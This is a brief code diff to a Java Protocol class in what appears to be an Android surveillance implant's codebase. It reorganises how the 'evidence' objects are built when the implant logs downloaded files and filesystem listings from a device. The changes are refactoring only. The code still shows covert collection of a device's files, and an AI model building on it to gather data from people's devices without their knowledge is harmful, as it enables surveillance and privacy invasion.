@@ -20,10 +20,10 @@ import java.util.Date;
 import java.util.Vector;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.Evidence;
-import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.conf.Configuration;
+import com.ht.RCSAndroidGUI.evidence.Evidence;
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
 import com.ht.RCSAndroidGUI.file.Path;
@@ -206,7 +206,7 @@ public abstract class Protocol {
 
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
-		final Evidence log = new Evidence(0);
+		//final Evidence log = new Evidence(0);
 
 		new LogR(EvidenceType.DOWNLOAD, LogR.LOG_PRI_STD, additional, content);
 
@@ -267,7 +267,7 @@ public abstract class Protocol {
 	 *            the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
-		final Evidence fsLog = new Evidence(0);
+		final Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
 		fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
 
 		// Expand path and create log
